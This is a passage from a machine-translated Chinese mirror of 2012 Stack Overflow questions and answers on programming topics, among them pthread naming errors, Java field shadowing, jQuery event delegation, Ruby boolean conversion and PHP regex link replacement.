  for (i=0; i<NTHREADS; ++i) {
    rc = pthread_join(threadid[i], NULL);
  }

  pthread_cond_destroy(&test_data.cond);
  pthread_mutex_destroy(&test_data.mutex);

  printf("Main completed\n");
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:50:17.710

问题是名为的成员`mutex`是 a`pthread_cond_t`而名为的成员`cond`是 a `pthread_mutex_t`。应该是不必要的演员可能隐藏了这个事实。

```
typedef struct _test_data_t {
  int conditionMet;
  pthread_mutex_t cond; // <-- poorly named
  pthread_cond_t mutex; // <-- poorly named
} test_data_t; 
```

线程函数中的这一行不需要强制转换：

```
 rc = pthread_mutex_lock((pthread_mutex_t *)&(test_data->mutex)); 
```

但是，您有几个没有演员表的调用（因此编译器应该大声抱怨这些）。我开始认为这可能是一个错字，这是一个红鲱鱼。

# ruby-on-rails - 如何防止 ActiveRecord 保存未更改的序列化列？

> ID：13537177
> 
> 赞同：3
> 
> 时间：2012-11-24T00:22:50.650
> 
> 标签：ruby-on-rails, activerecord, serialization, ruby-on-rails-3.2

> **可能重复：**
> [即使未更改，也停止 ActiveRecord 保存序列化列](https://stackoverflow.com/questions/9981257/stop-activerecord-saving-a-serialized-column-even-if-not-changed)

我`serialize`在 ActiveRecord 中有一个 d 列。它不跟踪脏状态，因为即使没有任何变化，它也会保存数据。

```
> p = Product.first
> p.save!
  UPDATE `products` SET `updated_at` = '...', `additional_data` = '--- \n' WHERE `products`.`id` = 2 
```

有什么办法可以防止它在没有变化的情况下更新？

我在 Rails 3.2.9 上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T03:32:22.867

这样做可能有更好的方法，但这里有

您可以使用 before_save 回调，如果没有任何改变则失败

在模型中，

```
before_save :check_for_changes

def check_for_changes
  if !self.changed?
    return false
  end
end 
```

并且不会发生保存过程。

但是我不明白这一点，当然，除非您在保存内容后做一些事情，否则您可以称其为已更改？方法也可以使其更加精确。

# java - 将对象添加到数组时出现 NullPointerException

> ID：13537181
> 
> 赞同：2
> 
> 时间：2012-11-24T00:23:35.750
> 
> 标签：java, arrays, nullpointerexception

好的，所以我遇到了一些生成空指针异常的代码的问题，这意味着我的代码正在尝试在应该使用对象的地方使用空值（直接来自 API）。我正在做的是我有一个名为 Hotel 的类，它有一个构造函数，它将一个字符串值分配给一个变量并创建一个 Room 类型的数组，一个对象。我知道这应该是直截了当的，但对于我的生活，我无法弄清楚这一点。

我会尽量保持代码尽可能简约：

对象 Hotel 的构造函数，它创建一个大小为 NUM_ROOMS 的新数组

**这是包含的更新，不幸的是我仍然遇到空指针问题**

```
public Hotel(String hotelName)
{
    name = hotelName;
    theRoom = new Room[NUM_ROOMS];
} 
```

此构造函数创建一个 Room 类型的数组，其参数分配给变量

```
public Room(String guestName, int partySize, int bedCountRequired,
        double ratePerDay, int daysStaying)
{
    guest = guestName;
    number = partySize;
    numBeds = bedCountRequired;
    rate = ratePerDay;
    numOfDays = daysStaying;
} 
```

以下方法应该：

1) 使用提供的参数创建对象 Room 的新实例

2) 在索引 roomsRented 处为该实例分配一个数组引用（在代码第一次初始化时定义为零，然后增加一）

```
public void addReservation(String guestName, int partySize,
        int bedCountRequired, double ratePerDay, int daysStaying)
{
    Room roomHolder = new Room(guestName, partySize, bedCountRequired,
            ratePerDay, daysStaying);

    theRoom[roomsRented] = roomHolder;

    roomsRented++;
} 
```

我遇到的问题是

```
theRoom[roomsRented] = roomHolder; 
```

似乎导致空指针异常。尽管我在上述方法中使用了数组变量 theRoom，但我也从 Eclipse 收到错误消息。这使我相信我没有正确引用该对象。但是，我不知道为什么该引用不正确，即使我在 theRoom[0] 中替换，编译器仍然给我一个空指针。我没有看到我的数组构造有任何问题，这对我来说意味着唯一可能导致空指针异常的问题是如果我没有引用数组中的任何值。

有什么想法吗？

如果答案非常简单，请提前感谢您的任何贡献和道歉。

**编辑***** 感谢您的帮助，找不到变量的问题已经解决，但是每次我尝试引用数组中的对象时，我仍然得到一个空指针异常。这是我如何尝试引用数组的示例：

```
public double getTotalRentalSales()
{
    // Iterate through the array
    for (int i = 0; i < theRoom.length; i++)
    {
        // sum the amount money received per rental
        totalRate = totalRate + theRoom[i].getRate();
    }
    // Return total
    return totalRate;
} 
```

其中 getRate() 是从对象 Room 返回可变速率的方法

```
totalRate = totalRate + theRoom[i].getRate(); 
```

在这种情况下导致空指针。我的对象引用有问题吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T00:33:42.987

问题是，在构造函数中，您在其范围内定义了一个名为 theRoom 的变量，这意味着您不会将值 new Room[NUM_ROOMS] 分配给名为**theRoom**的 Hotel 类字段，而是分配给构造函数中名为**房间**。

只需删除构造函数中的类型声明（Room[]），它就会按预期工作。我还建议将来使用**this**关键字来帮助您避免此类问题。

```
public Hotel(String hotelName)
{
 this.name = hotelName;
 this.theRoom = new Room[NUM_ROOMS];
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T00:35:19.833

问题出在 Hotel 的构造函数中：

```
public Hotel(String hotelName)
{
    name = hotelName;
    Room[] theRoom = new Room[NUM_ROOMS];
} 
```

您可能有一个 theRoom 实例字段，对吧？上面对 theRoom 的赋值创建了一个局部变量，它“隐藏”（并且独立于）theRoom 实例字段，并且一旦构造函数返回就会丢失。你想要的是初始化 theRoom 实例字段：

```
public Hotel(String hotelName)
{
    name = hotelName;
    theRoom = new Room[NUM_ROOMS];
} 
```

# java - 用于检查一个类是否扩展另一个类的Java方法？

> ID：13537183
> 
> 赞同：1
> 
> 时间：2012-11-24T00:23:52.037
> 
> 标签：java, extends

有什么方法可以检查一个类是否扩展了另一个类？上面的代码是片段

```
 File[] fileList = file.listFiles();
        if(fileList != null){
            for(int i = 0; i < fileList.length; ++i){
                ClassName = fileList[i].getName();
                if (fileList[i].isFile() && (Class Extends Class2) && ClassName.endsWith(".class")){
                    String ClassName1 = ClassName.split("\\.")[0];
                    if (!ClassName1.contains("$")){
                        if (packages != null){
                        <Snippet>
                        }
                    }
                }
            }
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:24:59.357

假设您有课程`A`和`B`. 要确定 A 是否扩展 B，您可以测试`A`with`instanceof`运算符的实例。这就足够了：

```
if((new A()) instanceof B)
    return true; 
```

# ios - 定义不透明度的 CAKeyframeAnimation 路径？

> ID：13537186
> 
> 赞同：1
> 
> 时间：2012-11-24T00:24:22.707
> 
> 标签：ios, cakeyframeanimation

CAKeyframeAnimation 可以与路径而不是关键帧值一起使用来动画（非位置）属性吗？这是关键代码：

```
CAKeyframeAnimation *theLeftGradientAnimation = [CAKeyframeAnimation animationWithKeyPath:@"opacity"];
theLeftGradientAnimation.removedOnCompletion = NO;
theLeftGradientAnimation.fillMode = kCAFillModeForwards;
theLeftGradientAnimation.duration = (isToClose ? self.fromDuration : self.toDuration);

//test with a linear monotonic path to define the opacity function response
UIBezierPath    *shadePath = [UIBezierPath bezierPath];
[shadePath moveToPoint:CGPointMake(0.0f, 0.0)];  //ASSUME coords are: x->t y->alpha(t)
[shadePath addLineToPoint:CGPointMake(1.0f, 1.0f)];  //ASSUME time normalized to duration
[shadePath closePath];

theLeftGradientAnimation.path = shadePath.CGPath; 
```

但是，这**不能**正常工作-不透明度确实可以平滑地动画，尽管不是单调的或完全根据路径的变化（假设路径从 (0.0,0.0) 到 (1.0,1.0) 像缓动一样“标准化”功能）。请注意，我**没有**为位置设置动画或在路径上移动图层，但希望将其用于任何可动画属性。

文档中有一些含糊之处，表明可以使用路径来有效地定义动画时间与动画属性的传递函数（从而替代将基于该传递函数创建的关键帧值数组） . 同样在“关键帧计时和起搏扩展”的 iOS 6 文档中，确实试图澄清路径与值的使用，但仍然模棱两可。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:54:45.890

请注意，`CAKeyframeAnimation`具有`timingFunctions`（复数）属性，并忽略`timingFunction`. 在您的情况下，由于您想要单调，您可能想要设置`theLeftGradientAnimation.timingFunction = kCAMediaTimingFunctionLinear`. 默认的 timingFunction 确实是非线性插值的。

有关timingFunctions 的更深入描述，以及`CAMediaTimingFunction`如果内置函数不够用，如何提供您自己的文档，请参阅文档。

# javascript - ajax加载内容上的jquery事件丢失

> ID：13537191
> 
> 赞同：0
> 
> 时间：2012-11-24T00:25:51.583
> 
> 标签：javascript, ajax, jquery

假设我有一些 HTML 内容，其中有一些文本区域。此 HTML 内容在执行某种操作（如单击按钮或其他操作）后通过 Ajax 加载。我遇到的问题是我丢失了与我的文本区域绑定的各种 jQuery 事件（比如`.change`事件或其他东西，所以如果我执行以下操作：

```
$('.my_textarea').change(function(){
    alert('TEST');
}); 
```

我的警报没有显示，因为我的 textarea 已经加载了 Ajax。有谁知道为什么会发生这个问题以及我该如何解决这个问题？

在此先感谢您的任何建议

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T00:30:20.817

```
$(document).on('change', '.my_textarea', function(){
    alert('TEST');
}); 
```

只需替换`document`为您的 textarea 最接近的静态（未通过 Ajax 加载）父级

# extjs - Sencha Touch 2.0.1.1 本地存储不保存值

> ID：13537196
> 
> 赞同：1
> 
> 时间：2012-11-24T00:26:32.590
> 
> 标签：extjs, touch, local-storage, local

我正在尝试存储在本地存储中并且它没有被存储。我需要将两个值作为状态 ID 和许可证类型存储为 1 条记录，下次我将更新它。因此，商店将始终有 1 条记录，如下所示。

```
{
 'stateId': 'NJ',
 'licenseType': 'BDL'
} 
```

我在过去 2 天尝试了不同的选项，但没有存储。有人可以告诉我我的代码中可能存在什么问题。

注意：我正在尝试测试使用的是 Chrome 浏览器。

商店代码

```
Ext.define("Sencha.store.TestParams", {    extend: "Ext.data.Store",
    requires: 
    [
        "Ext.data.proxy.LocalStorage"
    ],
    config: {
        model: "Sencha.model.TestParam",
        autoSync: true,
        proxy: {
            type: 'localstorage',
            id: 'ezdt-test-params'
        }
    }
}); 
```

型号代码：

```
Ext.define("Sencha.model.TestParam",
{
    extend: "Ext.data.Model",
    config:
    {
        idProperty: 'id',
        fields:
        [
            { name: 'id', type: 'int' },
            { name: 'stateId', type: 'string' },
            { name: 'licenseType', type: 'string' }
        ]
    }
}); 
```

保存代码的实际代码：

```
var modTestParamInitialValues = Ext.create("Sencha.model.TestParam", {
    id: 'ezdt', //Always Same as there will be only one record.
    stateId: strSelectedState,
    licenseType: strSelectedLicenseType
});
storTestParams.add(modTestParamInitialValues);
storTestParams.sync(); 
```

我用来检索存储值的代码。始终将其打印为未设置

```
var storTestParams = Ext.getStore("TestParams");
console.log("storTestParams#####-->" + storTestParams);
//storTestParams.load();
if(null != storTestParams)
{
    var intTestParamCount = storTestParams.getCount();
    if(intTestParamCount == 0)
    { 
        console.log("Not Set");
    }
    else
    { 
        console.log("Set Correctly");
    }
}
else
{ 
    console.log("Set Correctly");
} 
```

我希望我能提供所有细节。如果您需要更多详细信息，请告诉我。

谢谢你的帮助。约瑟夫

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-04T21:02:29.823

不知道你是否明白这一点，因为这个问题很老了。自从我第一次开始使用 Sencha Touch 2 进行开发以来，我在与 localstorage 同步时遇到了不同的麻烦。在同步时帮助我将记录放入 localstorage 的一件事是确保`dirty`模型实例的属性设置为 true。您可能想尝试一下。请参阅：[http ://docs.sencha.com/touch/2-1/#!/api/Ext.data.Model-method-setDirty](http://docs.sencha.com/touch/2-1/#!/api/Ext.data.Model-method-setDirty)

# django - Django url模板标签不起作用

> ID：13537200
> 
> 赞同：0
> 
> 时间：2012-11-24T00:27:15.637
> 
> 标签：django, django-templates

在 Django 中，在模板中，我这样做

```
{% url 'Customer.views.edit_customer' 1 %} 
```

我得到了一个`NoReverseMatch`例外。但是，在模板渲染之前的行中，我这样做：

```
print reverse('Customer.views.edit_customer', args=(1,)) 
```

并打印预期的 URL。我知道我总是可以传递反向的结果，但我想了解发生了什么。

网址模式是：

```
url(r'^customer/edit/(\d+)$', edit_customer), 
```

有没有办法在模板中做相当于反向调用的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:35:11.747

如果您使用的是 Django 1.4，请删除引号

```
{% url Customer.views.edit_customer 1 %} 
```

见[https://stackoverflow.com/a/4981105/44816](https://stackoverflow.com/a/4981105/44816)

Django 1.5 将接受引用的 url 匹配模式。如果您想引用您的模式，您可以从未来加载 url 模板标签。在模板中的第一个 url 标记之前使用以下内容

```
{% load url from future %} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T00:39:32.903

它没有按*我*预期的方式工作的原因是因为我忘了输入：

```
{% load url from future %} 
```

我一直在我的大多数模板中使用它，但忘记将它添加到这个模板中。

PS感谢该问题的链接，它给了我未来的答案。

# android - 使用 VideoView 播放高质量的 Youtube 视频

> ID：13537202
> 
> 赞同：7
> 
> 时间：2012-11-24T00:27:49.087
> 
> 标签：android, youtube, android-videoview

我正在开发一个音乐应用程序，它可以显示歌词和歌曲信息，还可以播放来自 youtube URL 的歌曲。

在我的活动中，有一些 TextView（用于歌词/信息）和一个 VideoView（用于 youtube 链接）。

我创建了一个名为 YoutubeVideo 的类，它执行以下操作：

1.  下载此页面的内容：[http://gdata.youtube.com/feeds/api/videos?q=SONG_NAME&v=2&max-results=1](http://gdata.youtube.com/feeds/api/videos?q=SONG_NAME&v=2&max-results=1)，解析其内容并获取 youtube 的 id（例如**EvuL5jyCHOw**）。这是一个 RSS 提要页面，用于搜索视频并显示 1 个结果（我需要做的就是更改查询）。
2.  下载此页面的内容：[http://gdata.youtube.com/feeds/api/videos?q=YOUTUBES_ID&format=1&alt=json](http://gdata.youtube.com/feeds/api/videos?q=YOUTUBES_ID&format=1&alt=json)，解析其内容并获取 rtsp（例如**rtsp://v7.cache3... 3GP**）。这是一个 XML 文件，其中包含有关视频的一些信息（名称、长度、缩略图，当然还有 - rtsp 链接 :)。
3.  我需要做的就是将 rtsp 设置为 VideoURI: `VideoView.setVideoURI(Uri.parse(rtsp))`并且正在播放视频。

如果你想知道，我会这样使用这个类：`new YoutubeVideo(VideoView).setVideo(artist + " " + title);`

**它可以工作，但我遇到了一个问题：它是一个 3gp 文件......质量真的很差。如何获得质量更好的网址？（mp4/flv/等？）**

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-19T20:19:55.817

我设法编写了一个函数，该函数获取 youtube 视频 html 代码（html 源代码）并返回一个包含所有可用视频链接的数组。然后我选择一个高质量的链接，并显示它而不是可怜的 3gp。

它并不完美，可能会有一些错误和改进：

```
 protected String[] extractLinks(String result) {
    //The title of the downloaded file
    String title = "bla bla bla";
    // An array of strings that will hold the links (in case of error, it will hold 1 string)
    String[] temper = new String[1];

    try{
        // Extract the "url_encoded_fmt_stream_map" attr from the flash object
        Pattern p = Pattern.compile("url_encoded_fmt_stream_map(.*?);");          
        Matcher m = p.matcher(result);
        List<String> matches = new ArrayList<String>();
        while(m.find()){
            matches.add(m.group().replace("url_encoded_fmt_stream_map=", "").replace(";", ""));                   
        }
        String[] streamMap = null;
        List<String> links = new ArrayList<String>();

        if(matches.get(0) != null &&  matches.get(0) != ""){
            // Split the "url_encoded_fmt_stream_map" into an array of strings that hold the link values
            streamMap = matches.get(0).split("%2C");
            for (int i = 0; i < streamMap.length; i++){
                String url = "";
                String sig = "";

                //Using regex, we will get the video url.
                Pattern p2 = Pattern.compile("url%3D(.*?)%26");       
                Matcher m2 = p2.matcher(streamMap[i]);
                List<String> matches2 = new ArrayList<String>();
                while(m2.find()){
                    // We don't need the "url=...&" part.
                    matches2.add(m2.group().substring(6, m2.group().length() - 3));
                }                     
                url = matches2.get(0);   

                //Using regex again, we will get the video signature.               
                p2 = Pattern.compile("sig%3D(.*?)%26");       
                m2 = p2.matcher(streamMap[i]);
                matches2 = new ArrayList<String>();
                while(m2.find()){
                // We don't need the "sig=...&" part.               
                    matches2.add(m2.group().substring(6, m2.group().length() - 3));
                }                     
                sig = matches2.get(0);   

                //Now lets add a link to our list. Link = url + sig + title.
                links.add(URLDecoder.decode(URLDecoder.decode(url + "&signature=", "UTF-8") + sig + "%26title%3D" + URLDecoder.decode(title, "UTF-8"), "UTF-8"));
            }
        }
        else{
        links.add("No download Links");
        }
        //Now lets make temper point to a array that holds the list items (aka links).
        temper = links.toArray(new String[links.size()]);
    }
    catch(Exception ex){
    temper[0] = ex.getMessage();
    }
    // That's it! temper has direct download links from youtube!
    return temper;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-31T05:25:50.100

我强烈建议您使用[官方 YouTube Api](https://developers.google.com/youtube/)。

请在链接下载示例 zip 文件并查看`FullscreenDemoActivity.java`文件。这实现了你们大多数人想要的。只需单击并以高质量、全屏切换和旋转时自动显示全屏显示嵌入的 YouTube 视频。

# ruby - 如何将布尔值转换为整数？

> ID：13537206
> 
> 赞同：34
> 
> 时间：2012-11-24T00:28:58.570
> 
> 标签：ruby, boolean

我有一个布尔值来检查它是否为真，然后设置一个局部变量。我如何重构它以使其更像 Ruby？

```
if firm.inflection_point
  inflection_point = 1
else
  inflection_point = 0
end 
```

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2012-11-24T00:47:48.253

```
inflection_point = (firm.inflection_point ? 1 : 0) 
```

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2017-01-18T01:26:11.307

另一种选择是使用短路运算符：

```
inflection_point && 1 || 0

irb(main):001:0> true && 1 || 0
=> 1
irb(main):002:0> false && 1 || 0
=> 0 
```

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2012-11-24T04:29:35.553

如果您只是在某一点上拥有它，那么[rudolph9 的答案](https://stackoverflow.com/a/13537312/4565784)很好，但是如果您到处都有类似的逻辑，那么考虑到猴子补丁的一般用途可能是有意义的：

```
class FalseClass; def to_i; 0 end end
class TrueClass; def to_i; 1 end end

inflection_point = firm.inflection_point.to_i 
```

在 Ruby 中，您应该让所有逻辑都处理真值而不是`0`and `1`，但我猜您正在处理来自/到某些处理`0`and的外部系统的一些输入或输出`1`。然后，这样做将是有意义的。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-11-24T13:40:14.947

在 Ruby 中，`if`是一个表达式。无需在`then`and`else`分支内分配变量，只需返回所需的值并将变量分配给`if expression`:

```
inflection_point = if firm.inflection_point
  1
else
  0
end 
```

在像这样的简单情况下，将整个表达式写在一行上更具可读性：

```
inflection_point = if firm.inflection_point then 1 else 0 end 
```

您还可以使用条件运算符，我个人认为它的可读性要差得多：

```
inflection_point = firm.inflection_point ? 1 : 0 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-11-24T05:34:35.797

您需要的是一种称为三元运算符的条件运算，它几乎用于每种语言，并且使用符号？和 ：

```
inflection_point = firm.inflection_point ? 1 : 0 
```

基本上意味着，如果第一个条件评估为真（firm.inflection_point），则返回“？”之后的值 (1) 否则返回“:”后面的值 (0)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-02-21T08:50:40.603

它不是纯红宝石解决方案，但是，您可以使用`ActiveRecord::Type::Integer.new.cast(true)`

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2020-12-28T06:13:05.723

我刚刚注意到很多人建议 Monkey Patch ruby​​ 类并`.to_i`在它们上实现方法以解决这个问题。

我需要温和地告知**猴子修补**的`TrueClass`行为`FalseClass` [可能对您的系统造成危险](http://www.rubyinside.com/the-end-of-monkeypatching-4570.html)

一个好的方法是使用[Ruby Refinements](https://docs.ruby-lang.org/en/2.4.0/syntax/refinements_rdoc.html)来进行更安全的猴子补丁。*这种方法将猴子修补*类的更改限制在您的类范围内。

*   `lib/refinements/boolean_refinements.rb`

```
module BooleanRefinements
  refine FalseClass do
    def to_i
      0
    end
  end

  refine TrueClass do
    def to_i
      1
    end
  end
end 
```

*   `/your_class.rb`

```
require 'refinements/boolean_refinements'

class MyClass
  using BooleanRefinements

  # Here you can use true.to_i and false.to_i as you wish
end 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-01-20T21:06:48.340

这是另一种方法：

`5 - bool.to_s.length`

这利用了`'true'`有四个字符而`'false'`有 5 个字符的事实。

# php - 如何使用 PHP 更改输入的文本

> ID：13537210
> 
> 赞同：2
> 
> 时间：2012-11-24T00:29:11.457
> 
> 标签：php, regex, sed

好的，所以我在网站上有一个通用的 html 表单，用户可以在其中写入和提交内容。

我想写一段 PHP 来获取整个文本并转换一些特定的值。

例如，文本：

> > > Etiam non purus in dolor placerat sollicitudin。在 dignissim elit ut libero sodales 中，一个 sodales nunc blandit。Supendi sse vitae odio mauris, eu pulvinar augue。在坐 amet libero vel tellus posuere volutpat。twitter::Lipsum facebook::Lipsum Nulla sed purus vel orci ultrices tincidunt。Maecenas 非 sem eget risus volutpat placerat。

注意 facebook::Lipsum twitter::Lipsum

我希望 php 浏览该文本并知道 facebook::Lipsum 应该自动更改为[http://www.facebook.com/Lipsum](http://www.facebook.com/Lipsum)和 twitter 一个[http://www.twitter.com/Lipsum](http://www.twitter.com/Lipsum)

谁能建议如何做到这一点（使用 preg_match 或 str_replace）？我不确定已经搜索了一段时间，也没有找到任何具体的东西。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:01:38.350

您通常可以像这样替换包含 :: 标记的任何文本：

```
$text = "Etiam non purus in dolor placerat sollicitudin. In dignissim elit ut libero sodales a sodales nunc blandit. Suspendi sse vitae odio mauris, eu pulvinar augue. In sit amet libero vel tellus posuere volutpat. twitter::Lipsum facebook::Lipsum Nulla sed purus vel orci ultrices tincidunt. Maecenas non sem eget risus volutpat placerat.";

preg_replace("[(\w+)::]", "http://www.$1.com/", $text); 
```

它说抓住任何包含 :: 的文本块并替换为`http://www.{string}.com/`

`[(\w+)::]`表示匹配任何单词字符并以 :: 结尾 - 大括号表示包含这个的整体，所以只是 [::] 只会替换 :: 而 [(\w+) 以任何单词开头直到它遇到 ::] 并在其中分配该值() 到变量 $1

[http://msdn.microsoft.com/en-us/library/az24scfc.aspx](http://msdn.microsoft.com/en-us/library/az24scfc.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:16:30.390

请注意，这只会匹配 twitter 和 facebook

```
preg_replace("/(facebook|twitter)::([\w]+)/", '<a href="http://www.$1.com/$2" target="_blank">http://www.$1.com/$2</a>', $yourText); 
```

演示：[http ://codepad.viper-7.com/hs3xgw](http://codepad.viper-7.com/hs3xgw)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-24T01:15:36.033

您还可以使用以下`preg_*`功能：

```
$arr = array(
    'twitter' => 'www.twitter.com',
    'facebook' => 'www.facebook.com'
    // use lowercase keys here
    // or uncomment the next line
);
//$arr = array_change_key_case($arr,CASE_LOWER);

function replaceLinks($m) {
    global $arr;
    // make this array accessible
    $key = $m[1];   // this is the array key
    $page = $m[2];  // this is the part after ::
    $addr = 'http://'.$arr[strtolower($key)].'/'.$page;
    // get the value (address) from the array
    return "<a href=\"$addr\" target=\"_blank\">$addr</a>";
    // and return it as an anchor element
}

$newStr = preg_replace_callback(
    '~\b('.implode('|',array_keys($arr)).')::(\S*)~i',
    // this will basically compile into the following pattern:
    // ~\b(twitter|facebook)::(\S+)~i
    // where \b signifies beginning of word
    // and \S* signifies 0 or more non empty chars
    // so don't forget to urlencode or rawurlencode
    // the part after :: just in case
    'replaceLinks', // execute this function
    $str
);

echo "<p>$newStr</p>"; 
```

# websocket - 是否可以随意断开与 Meteor 服务器的连接？

> ID：13537212
> 
> 赞同：2
> 
> 时间：2012-11-24T00:29:27.847
> 
> 标签：websocket, meteor

我想制作一个仅定期检查更新的应用程序，并且不需要在整个活动期间都打开连接。没有黑客这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-22T13:05:38.170

无法断开客户端与服务器的连接。您最多可以做的是停止在服务器上运行 Meteor，然后定期启动并再次关闭它，我不建议这样做。

Meteor 的设计初衷就是始终保持连接。从实时模板到客户端 Minimongo 缓存的一切都依赖于该连接的工作，所以如果你禁用它，你会故意破坏 Meteor 的一个基本层，这应该可以为你节省很多麻烦。

# java - 为什么我的代码不起作用？

> ID：13537216
> 
> 赞同：0
> 
> 时间：2012-11-24T00:30:04.153
> 
> 标签：java, regex, java.util.scanner

此方法应该将下一个问题加载到 GUI 中。

```
public void readNextEntry() {

    list = new ArrayList<String>();

    scanner = new Scanner(linesFromFile.get(currentQuestion)).useDelimiter(",|\n");
    for (int i = 0; i < 8; i++) {
        list.add(scanner.next());
    }
} 
```

它应该加载的文本文件格式如下：

```
001,what color is the sky,it is blue because of precipitation,green,blue,yellow,red,a,   
002,What color are my eyes,they are blue if you look,blue,brown,green,black,a,    
003,What color is the water,it is blue because of water,green,blue,red,yellow,b, 
```

为什么它不起作用？它应该加载类别 ( `001`)、问题 ( `what color is the sky?`) 和它的选择 ( `green,blue,yellow,red`)。我的正则表达式关闭了吗？

编辑：一点上下文，这是完整的代码。到目前为止，一直在尝试来自该线程的建议，但没有成功。

```
package TestAssignment;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Scanner;
import javax.swing.*;
import javax.swing.border.Border;

public class TestGui extends JFrame implements ActionListener {

private int counter = 0;
private int totalCount = 0;
private JTextArea question = new JTextArea();
private JTextArea recomendedAnswer = new JTextArea();
private JTextArea category = new JTextArea();
private ArrayList<String> list;
private ArrayList<String> linesFromFile;
private int currentQuestion = 0;
private ButtonGroup group = new ButtonGroup();
private ArrayList<JRadioButton> theButtons;
private JLabel response = new JLabel("");
private JButton answer = new JButton("Answer Question");
private Border border = BorderFactory.createLineBorder(Color.BLACK, 1);
private Scanner scanner;
private String fileName;

public void readNextEntry() {

    list = new ArrayList<String>();

    scanner = new Scanner(linesFromFile.get(currentQuestion)).useDelimiter(",|\n");
    for (int i = 0; i < 8; i++) {
        list.add(scanner.next());
    }
}

public void readFile() {
    linesFromFile = new ArrayList<String>();
    list = new ArrayList<String>();
    try {

        scanner = new Scanner(new File(fileName));
        while (scanner.hasNextLine()) {
            linesFromFile.add(scanner.nextLine());
        }
        Collections.shuffle(linesFromFile);
    } catch (FileNotFoundException e) {
        e.printStackTrace();
    }
}

public TestGui(String in) {

    setLayout(new GridLayout(11, 25));
    this.fileName = in;

    add(new JLabel("Category : "));
    JScrollPane scrollPane1 = new JScrollPane(category);
    category.setLineWrap(true);
    category.setBorder(border);
    add(scrollPane1);
    category.setEditable(false);

    //int randomNumber = (int) (Math.random() * 10) + 1;
    //String line = TestGui.readFileByLine("Questions.txt", randomNumber);

    add(new JLabel("Question: "));
    JScrollPane scrollPane2 = new JScrollPane(question);
    question.setLineWrap(true);
    question.setBorder(border);
    add(scrollPane2);
    question.setEditable(false);

    readFile();
    readNextEntry();

    add(new JLabel("Please Select the correct Answer"));

    theButtons = new ArrayList<JRadioButton>();

    for (int i = 0; i < 4; i++) {
        JRadioButton temp = new JRadioButton();
        theButtons.add(temp);
        add(temp);
        group.add(temp);
    }
    refreshButtonLabels();

    add(response);

    category.setText(list.get(0));
    question.setText(list.get(1));

    add(answer);

    answer.addActionListener(this);
   }

  public void refreshButtonLabels() {
    for (int i = 0; i < 4; i++) {
        theButtons.get(i).setText(list.get(i + 3));
    }
  }

    @Override
    public void actionPerformed(ActionEvent e) {
    if (e.getSource() == answer) {
        for (int i = 0; i < theButtons.size(); i++) {
            JRadioButton button = theButtons.get(i);
            if (button.isSelected() && list.get(7).equals("a")) {
                counter++;
                readNextEntry();
            }
            else if (button.isSelected() && list.get(7).equals("b")){
                counter++;
                readNextEntry();
            }
             else if (button.isSelected() && list.get(7).equals("c")){
                counter++;
                readNextEntry();
            }
             else if (button.isSelected() && list.get(7).equals("d")){
                counter++;
                readNextEntry();

            }
        }
    }
     else {
           readNextEntry();
          {
    }
    }

package TestAssignment;

import javax.swing.JFrame;

public class Test {
public static void main(String[] args) {
    TestGui test = new TestGui();
    test.setVisible(true);
    test.setSize(600, 600);
    test.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T02:36:41.047

你会发现简单地用逗号分割字符串要容易得多：

```
String line = linesFromFile.get(currentQuestion);
String[] list = line.split(",\\s*"); 
```

扫描仪正在妨碍您。但是当你使用 Scanner 时，千万不要在**没有**`nextXXX()`先调用相关方法的情况下调用它的方法之一`hasNextXXX()`。例如：

```
while (scanner.hasNext())
{
  list.add(scanner.next());
} 
```

如果使用得当，Scanner 绝不应该抛出 NoSuchElementException。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:06:19.980

理论上这应该有效。令人困惑的事情是计算出仅在您的代码段中暗示的变量类型。

```
static List<String> linesFromFile = new ArrayList<String>();
static {
    linesFromFile.add("001,what color is the sky,it is blue because of precipitation,green,blue,yellow,red,a,");
    linesFromFile.add("002,What color are my eyes,they are blue if you look,blue,brown,green,black,a,");
    linesFromFile.add("003,What color is the water,it is blue because of water,green,blue,red,yellow,b,");
}

public static void main(String[] args) {
    List<String> list = new ArrayList<String>();

    Scanner scanner = new Scanner(linesFromFile.get(1)).useDelimiter(",|\n");
    for (int i = 0; i < 8; i++) {
        list.add(scanner.next());
    }
    System.out.println(Arrays.toString(list.toArray()));
} 
```

印刷`[002, What color are my eyes, they are blue if you look, blue, brown, green, black, a]`

如果您已经将它们用行分隔，为什么还要用“\n”分隔？似乎其中一条线没有您期望的足够元素。您应该在获取单个元素（或仅调试它）之前尝试输出该行。

# matlab - 合并 2 个 .mat 文件

> ID：13537217
> 
> 赞同：1
> 
> 时间：2012-11-24T00:30:15.500
> 
> 标签：matlab, mat-file

